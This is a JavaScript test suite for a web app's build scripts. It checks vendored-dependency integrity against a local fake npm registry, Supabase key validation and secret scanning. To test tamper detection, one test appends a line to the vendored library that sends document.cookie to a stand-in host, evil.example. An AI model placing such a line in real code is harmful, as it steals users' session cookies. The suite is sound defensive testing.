/* Tests for scripts/build.js, scripts/vendor-deps.js and scripts/check-secrets.js.
 * Classification: automated test against a LOCAL FAKE npm registry (not the real registry, not real Supabase). */
const fs = require('fs'), os = require('os'), path = require('path'), http = require('http'), zlib = require('zlib'), crypto = require('crypto');
const { spawnSync, spawn } = require('child_process');
const REPO = path.resolve(__dirname, '../..');
let failed = 0, total = 0; const ok = (n, c, x) => { total++; if (!c) failed++; console.log((c ? 'PASS ' : 'FAIL ') + n + (c || !x ? '' : '  -> ' + x)); };

const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
const jwt = o => b64u({ alg: 'HS256', typ: 'JWT' }) + '.' + b64u(o) + '.' + 'x'.repeat(20);
const ANON = ref => jwt({ iss: 'supabase', ref, role: 'anon', iat: 1, exp: 4102444800 });

function tar(entries) {
  const bl = [];
  for (const [name, data] of Object.entries(entries)) {
    const h = Buffer.alloc(512); h.write(name); h.write('0000644\0', 100); h.write('0000000\0', 108); h.write('0000000\0', 116);
    h.write(data.length.toString(8).padStart(11, '0') + '\0', 124); h.write('00000000000\0', 136); h.write('        ', 148); h[156] = 48;
    h.write('ustar\0' + '00', 257); let sum = 0; for (const b of h) sum += b; h.write(sum.toString(8).padStart(6, '0') + '\0 ', 148);
    bl.push(h, data, Buffer.alloc((512 - data.length % 512) % 512));
  }
  bl.push(Buffer.alloc(1024)); return Buffer.concat(bl);
}
const LIB = Buffer.from('/* fake supabase umd */\n' + 'var supabase={};'.repeat(200));
function registry(opts = {}) {
  const tgz = zlib.gzipSync(tar({ [opts.entry || 'package/dist/umd/supabase.js']: opts.lib || LIB, 'package/package.json': Buffer.from('{}') }));
  const integ = opts.lie ? 'sha512-' + Buffer.alloc(64, 1).toString('base64') : 'sha512-' + crypto.createHash('sha512').update(tgz).digest('base64');
  return new Promise(res => { const srv = http.createServer((q, r) => {
    if (q.url.endsWith('/tarball.tgz')) { r.end(tgz); return; }
    r.end(JSON.stringify({ version: '2.45.4', dist: { tarball: 'http://127.0.0.1:' + srv.address().port + '/tarball.tgz', integrity: integ } }));
  }).listen(0, '127.0.0.1', () => res(srv)); });
}
function sandbox() {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'stashbuild-'));
  for (const f of ['index.html', 'styles.css', 'landing.css', 'script.js', 'auth.js', 'cloud.js', 'data.json', 'manifest.json', 'vendor.lock.json']) fs.copyFileSync(path.join(REPO, f), path.join(d, f));
  fs.mkdirSync(path.join(d, 'scripts')); for (const f of ['build.js', 'vendor-deps.js', 'check-secrets.js']) fs.copyFileSync(path.join(REPO, 'scripts', f), path.join(d, 'scripts', f));
  return d;
}
const run = (d, script, args = [], env = {}) => spawnSync('node', ['scripts/' + script, ...args], { cwd: d, encoding: 'utf8', env: { PATH: process.env.PATH, ...env } });
const runA = (d, script, args = [], env = {}) => new Promise(res => { const c = spawn('node', ['scripts/' + script, ...args], { cwd: d, env: { PATH: process.env.PATH, ...env } }); let o = '', e = ''; c.stdout.on('data', x => o += x); c.stderr.on('data', x => e += x); c.on('close', st => res({ status: st, stdout: o, stderr: e })); });
const GOOD = { SUPABASE_URL: 'https://abcdefgh.supabase.co', SUPABASE_ANON_KEY: ANON('abcdefgh') };

(async () => {
  // --- vendoring against a fake registry
  const srv = await registry(); const REG = 'http://127.0.0.1:' + srv.address().port;
  let d = sandbox();
  ok('unpopulated lock: Vercel build fails with a clear message', (r => r.status !== 0 && /not been populated/.test(r.stderr))(run(d, 'build.js', [], { ...GOOD, VERCEL: '1' })));
  ok('unpopulated lock: --skip-vendor-check works locally (warns)', (r => r.status === 0 && /vendor check skipped/.test(r.stderr))(run(d, 'build.js', ['--skip-vendor-check'], GOOD)));
  ok('--skip-vendor-check is IGNORED on Vercel', (r => r.status !== 0)(run(d, 'build.js', ['--skip-vendor-check'], { ...GOOD, VERCEL: '1' })));
  let r = await runA(d, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: REG });
  ok('--update vendors the file and writes the lock', r.status === 0 && fs.existsSync(path.join(d, 'vendor/supabase.js')) && JSON.parse(fs.readFileSync(path.join(d, 'vendor.lock.json'))).fileIntegrity.startsWith('sha384-'), r.stderr);
  ok('vendored bytes equal the tarball entry', fs.readFileSync(path.join(d, 'vendor/supabase.js')).equals(LIB));
  ok('verify (offline) passes', run(d, 'vendor-deps.js').status === 0);
  r = run(d, 'build.js', [], { ...GOOD, VERCEL: '1', VERCEL_ENV: 'production' });
  ok('build passes with vendored file + matching project', r.status === 0 && /Vendored dependency verified/.test(r.stdout), r.stderr);
  ok('build log states environment and project ref', /production; Supabase project: abcdefgh/.test(r.stdout));
  const env = fs.readFileSync(path.join(d, 'dist/env-config.js'), 'utf8');
  ok('dist/env-config.js holds only the two public values', Object.keys(JSON.parse(env.match(/STASH_ENV = (.*);/)[1])).join() === 'SUPABASE_URL,SUPABASE_ANON_KEY');
  ok('dist contains the vendored client', fs.existsSync(path.join(d, 'dist/vendor/supabase.js')));
  fs.appendFileSync(path.join(d, 'vendor/supabase.js'), '\n;fetch("https://evil.example/"+document.cookie)');
  r = run(d, 'build.js', [], { ...GOOD, VERCEL: '1' }); ok('tampered vendor file -> build fails', r.status !== 0 && /does not match vendor.lock.json/.test(r.stderr));
  ok('tampered vendor file -> offline verify fails', run(d, 'vendor-deps.js').status !== 0);

  // --- config checks (vendor OK again)
  d = sandbox(); await runA(d, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: REG });
  const b = (env, extra = {}) => run(d, 'build.js', [], { VERCEL: '1', ...env, ...extra });
  ok('anon key from ANOTHER project -> fails', (r => r.status !== 0 && /mixed up/.test(r.stderr))(b({ SUPABASE_URL: GOOD.SUPABASE_URL, SUPABASE_ANON_KEY: ANON('zzzzzzzz') })));
  ok('service_role JWT as anon key -> fails', (r => r.status !== 0 && /SECRET/.test(r.stderr))(b({ SUPABASE_URL: GOOD.SUPABASE_URL, SUPABASE_ANON_KEY: jwt({ ref: 'abcdefgh', role: 'service_role', exp: 4102444800 }) })));
  ok('sb_secret_ key -> fails', (r => r.status !== 0 && /SECRET/.test(r.stderr))(b({ SUPABASE_URL: GOOD.SUPABASE_URL, SUPABASE_ANON_KEY: 'sb_secret_' + 'a'.repeat(30) })));
  ok('sb_publishable_ key -> accepted', b({ SUPABASE_URL: GOOD.SUPABASE_URL, SUPABASE_ANON_KEY: 'sb_publishable_' + 'a'.repeat(30) }).status === 0);
  ok('expired anon key -> fails', (r => r.status !== 0 && /expired/.test(r.stderr))(b({ SUPABASE_URL: GOOD.SUPABASE_URL, SUPABASE_ANON_KEY: jwt({ ref: 'abcdefgh', role: 'anon', exp: 5 }) })));
  ok('localhost URL on Vercel -> fails', b({ SUPABASE_URL: 'http://localhost:54321', SUPABASE_ANON_KEY: GOOD.SUPABASE_ANON_KEY }).status !== 0);
  ok('non-Supabase https URL -> fails', b({ SUPABASE_URL: 'https://evil.example.com', SUPABASE_ANON_KEY: GOOD.SUPABASE_ANON_KEY }).status !== 0);
  ok('missing variables on Vercel -> fails', b({}).status !== 0);
  ok('production pinned to a different project ref -> fails', b(GOOD, { VERCEL_ENV: 'production', STASH_PROD_SUPABASE_REF: 'prodprodprod' }).status !== 0);
  ok('local build without variables still works (warns)', (r => r.status === 0 && /not set/.test(r.stderr))(run(d, 'build.js', [], {})));

  // --- secret scanning
  for (const [label, file, content, expect] of [
    ['Google client secret in a doc', 'docs/x.md', 'secret: GOCSPX-' + 'A'.repeat(28), /Google OAuth client secret/],
    ['service_role JWT inside a JS file', 'extra.js', 'const k="' + jwt({ ref: 'abcdefgh', role: 'service_role' }) + '"', /service_role/],
    ['sb_secret_ in a json file', 'cfg.json', '{"k":"sb_secret_' + 'b'.repeat(30) + '"}', /Supabase secret key/],
    ['PEM key', 'k.txt', '-----BEGIN ' + 'PRIVATE KEY-----\nabc', /PEM/],
  ]) {
    d = sandbox(); await runA(d, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: REG });
    fs.mkdirSync(path.dirname(path.join(d, file)), { recursive: true }); fs.writeFileSync(path.join(d, file), content);
    const rr = run(d, 'build.js', [], { ...GOOD, VERCEL: '1' });
    ok('secret scan blocks build: ' + label, rr.status !== 0 && expect.test(rr.stderr), rr.stderr.slice(0, 200));
    ok('  ...and never prints the secret itself', !/GOCSPX-A{10}|sb_secret_b{10}/.test(rr.stderr + rr.stdout));
  }
  d = sandbox(); ok('check-secrets passes on the real repo', run(REPO, 'check-secrets.js').status === 0, run(REPO, 'check-secrets.js').stderr);

  // --- hostile registries
  const upd = async (o, pre) => { const s = await registry(o); const dd = sandbox(); if (pre) pre(dd); const rr = await runA(dd, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: 'http://127.0.0.1:' + s.address().port }); s.close(); return { rr, dd }; };
  let x = await upd({ lie: true }); ok('tarball not matching the registry integrity -> refused, nothing written', x.rr.status !== 0 && !fs.existsSync(path.join(x.dd, 'vendor/supabase.js')));
  x = await upd({ entry: 'package/dist/other.js' }); ok('expected file missing from tarball -> refused', x.rr.status !== 0 && /not found in the package/.test(x.rr.stderr));
  d = sandbox(); await runA(d, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: REG });
  const s2 = await registry({ lib: Buffer.from('/* different */' + 'y'.repeat(2000)) });
  r = await runA(d, 'vendor-deps.js', ['--update'], { STASH_NPM_REGISTRY: 'http://127.0.0.1:' + s2.address().port });
  ok('re-vendoring the same version with a DIFFERENT tarball -> refused', r.status !== 0 && /DIFFERENT tarball hash/.test(r.stderr));
  ok('  ...and the previously vendored file is untouched', fs.readFileSync(path.join(d, 'vendor/supabase.js')).equals(LIB));
  srv.closeAllConnections?.(); s2.closeAllConnections?.(); srv.close(); s2.close();
  console.log(`\nBUILD TESTS: ${total} checks, ${failed} failed`); process.exit(failed ? 1 : 0);
})();
